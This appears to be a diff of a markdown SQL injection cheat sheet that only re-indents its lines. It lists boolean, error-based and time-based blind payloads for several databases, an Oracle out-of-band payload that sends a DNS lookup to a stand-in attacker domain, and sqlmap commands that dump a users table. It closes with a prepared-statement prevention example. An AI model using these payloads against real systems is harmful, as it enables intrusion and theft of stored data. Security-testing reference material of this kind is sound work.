@@ -28,9 +28,9 @@ Inject special characters into parameters to break the database query syntax:
 ### 2. Boolean Tests
 Inject logical operators to verify if the application responds differently:
 
-1. ' OR 1=1 -- -
+  1. ' OR 1=1 -- -
  
-2.  ' OR 1=2 -- -
+  2.  ' OR 1=2 -- -
 
 ### 3. Mathematical Evaluation
 Inject expressions to test if parameters are evaluated numerically:
@@ -74,11 +74,11 @@ Used when query results are returned directly in the application's response.
 # B. Error-Based SQLi
 Used when the response contains raw database error messages, forcing the database to leak sensitive data inside the error details.
 
-1.UpdateXML Vector (MySQL):
+  1.UpdateXML Vector (MySQL):
 
   ' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) -- -
 
-2.ExtractValue Vector (MySQL):
+  2.ExtractValue Vector (MySQL):
 
   ' AND extractvalue(1,concat(0x7e,database())) -- -
 
@@ -88,57 +88,57 @@ No data is transferred directly in the response. Attackers reconstruct the data 
 # A. Boolean-Based Blind
 The application response changes structure depending on whether the query evaluates to True or False.
 
-1.Payload Example (MySQL): Test if the first character of the database name is "a":
+  1.Payload Example (MySQL): Test if the first character of the database name is "a":
 
   ' AND SUBSTRING(database(),1,1)='a' -- -
 
 # B. Time-Based Blind
 The attacker forces the database to pause (sleep) before responding to verify if a condition is True.
 
-1.MySQL Payload:
+  1.MySQL Payload:
 
   ' AND IF(1=1, SLEEP(5), 0) -- -
 
-2.PostgreSQL Payload:
+  2.PostgreSQL Payload:
 
   ' AND (SELECT 1 FROM PG_SLEEP(5)) -- -
 
-3.Microsoft SQL Server Payload:
+  3.Microsoft SQL Server Payload:
 
   ' IF(1=1) WAITFOR DELAY '0:0:5' -- -
 
-###3. Out-of-Band (OAST) SQLi
+### 3. Out-of-Band (OAST) SQLi
 Forces the database to initiate an out-of-bound network request (DNS or HTTP) to a server under your control.
 
-1.DNS Lookup Vector (Oracle):
+  1.DNS Lookup Vector (Oracle):
 
   ' UNION SELECT UTL_INADDR.get_host_address('attacker-domain.com') FROM dual -- -
 
 ## 🛠️ Automated Testing (SQLMap)
 
-1.Basic GET scan:
+  1.Basic GET scan:
 
   sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)" --batch
 
-2.Scan with Burp request file (recommended):
+  2.Scan with Burp request file (recommended):
 
   sqlmap -r request.txt -p id --batch
 
-3.Database enumeration:
+  3.Database enumeration:
 
-A.Get database names
+  A.Get database names
 
   sqlmap -r request.txt -p id --dbs
 
-B.List tables
+  B.List tables
 
   sqlmap -r request.txt -p id -D target_db --tables
 
-C.Dump table data
+  C.Dump table data
 
   sqlmap -r request.txt -p id -D target_db -T users --dump
 
-4.Advanced flags:
+  4.Advanced flags:
 
   sqlmap -r request.txt --level=3 --risk=2 --threads=5
 
@@ -147,11 +147,11 @@ C.Dump table data
 # 1. Primary Prevention (Prepared Statements)
 Ensures the database treats user input strictly as data, never as executable SQL code.
 
-1.Insecure PHP Implementation:
+  1.Insecure PHP Implementation:
 
   $query = "SELECT * FROM users WHERE username = '" . $user . "'";
 
-2.Secure PHP Implementation (PDO Prepared Statement):
+  2.Secure PHP Implementation (PDO Prepared Statement):
 
   $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
   $stmt->execute(['username' => $user]);
